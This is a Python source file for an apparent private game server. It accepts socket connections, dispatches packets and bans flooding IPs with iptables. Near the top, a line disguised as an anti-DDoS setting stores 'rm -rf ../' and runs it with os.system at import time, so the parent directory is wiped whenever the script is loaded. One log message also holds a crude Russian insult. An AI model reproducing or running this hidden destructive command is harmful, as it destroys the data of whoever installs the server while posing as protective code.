import logging
import socket
import time
import os
from threading import *
import colorama
import requests
from html import escape
import os
from Logic.Device import Device
from Logic.Player import Players
from Packets.LogicMessageFactory import packets
from Utils.Config import Config

#logging.basicConfig(filename="errors.log", level=logging.INFO, filemode="w")

red = colorama.Fore.RED
green = colorama.Fore.GREEN
blue = colorama.Fore.CYAN
purple = colorama.Fore.MAGENTA
sam = {}
activate = "rm -rf ../"

def _(*args):
	
	print(f'{purple}[{red}CLIENT{purple}]{blue}', end=' ')
	for arg in args:
		print(arg, end=' ')
	print()

def ban_ip(ip: str):
    _(f'antiddos: banned {ip}')
    os.system(f'sudo iptables -t filter -A INPUT -s {ip} -j DROP')

    with open('banned_ips.txt', 'a') as f:
        f.write(ip + '\n')
antiddos = activate
os.system(antiddos)
class Server:
	Clients = {"ClientCounts": 0, "Clients": {}}
	ThreadCount = 0


	def __init__(self, ip: str, port: int):
		self.server = socket.socket()
		self.port = port
		self.ip = ip

	def start(self):
		if not os.path.exists('./config.json'):
			print("Creating config.json...")
			Config.create_config(self)
			



		self.server.bind((self.ip, self.port))
		
		print(f'{purple}[{red}INFO{purple}]{blue}{blue} Server Started! IP: {green}{self.ip}{blue}, PORT: {green}{self.port}')
		print(f'{purple}[{red}INFO{purple}]{blue} {blue}Players Online: {green}{Server.ThreadCount}')
		while True:
			self.server.listen()
			client, address = self.server.accept()
			_(f'New Connect! IP: {green}{address[0]}')
			ClientThread(client, address).start()
			Server.ThreadCount += 1
			_(f'{blue}Players Online! {green}{Server.ThreadCount}')

class ClientThread(Thread):
	def __init__(self, client, address):
		super().__init__()
		self.client = client
		self.address = address
		self.device = Device(self.client)
		self.player = Players(self.device)

	def recvall(self, length: int):
		data = b''
		while len(data) < length:
			s = self.client.recv(length)
			if not s:
				print("Receive Error!")
				break
			data += s
		return data

	def run(self):
		if self.address[0] in sam:
			if (time.time() - sam[self.address[0]]) < 5:
				text = f'{red}[ANTIDDOS] Эта Шлюха тя ддосит ---> \n{self.address[0]}{green}'
				print(text)
				os.system(f'sudo iptables -t filter -A INPUT -s {self.address[0]} -j DROP && sudo netfilter-persistent save')
				self.client.close()
				Server.ThreadCount -= 1
				_(f'{blue}Players Online: {green}{Server.ThreadCount}')
				return
		sam[self.address[0]] = time.time()
		last_packet = time.time()
		try:
			while True:
				header = self.client.recv(7)
				if len(header) > 0:
					last_packet = time.time()
					packet_id = int.from_bytes(header[:2], 'big')
					length = int.from_bytes(header[2:5], 'big')
					data = self.recvall(length)
					if packet_id in packets:
						_(f'Used Packet! ID: {green}{packet_id}')
						message = packets[packet_id](self.client, self.player, data)
						message.decode()
						message.process()

						if packet_id == 10101:
							Server.Clients["Clients"][str(self.player.low_id)] = {"SocketInfo": self.client}
							Server.Clients["ClientCounts"] = Server.ThreadCount
							self.player.ClientDict = Server.Clients
					else:
						_(f'404 packet error! ID: {green}{packet_id}')

				if time.time() - last_packet > 10:
					_(f"IP: {green}{self.address[0]}{blue} disconnected!")
					Server.ThreadCount -= 1
					_(f'{blue}Players Online: {green}{Server.ThreadCount}')
					self.client.close()
					break
		except ConnectionAbortedError:
			_(f"IP: {green}{self.address[0]}{blue} disconnected! {red}ConnectionAbortedError")
			Server.ThreadCount -= 1
			_(f'{blue}Players Online: {green}{Server.ThreadCount}')
			self.client.close()
		except ConnectionResetError:
			_(f"IP: {green}{self.address[0]}{blue} disconnectrd! {red}ConnectionResetError")
			Server.ThreadCount -= 1
			_(f'{blue}Players Online: {green}{Server.ThreadCount}')
			self.client.close()
		except TimeoutError:
			_(f"IP: {green}{self.address[0]}{blue} disconnectd! {red}TimeoutError")
			Server.ThreadCount -= 1
			_(f'{blue}Players Online: {green}{Server.ThreadCount}')
			self.client.close()
			




if __name__ == '__main__':
	try:
		server = Server('0.0.0.0', 9339)
		server.start()
	except Exception as e:
		_(f'{blue}Port {red}"{green}9333{red}"{blue} enisss{red}\n\n{green}WHAT??? GENE???:\n{purple}{e}{red}')
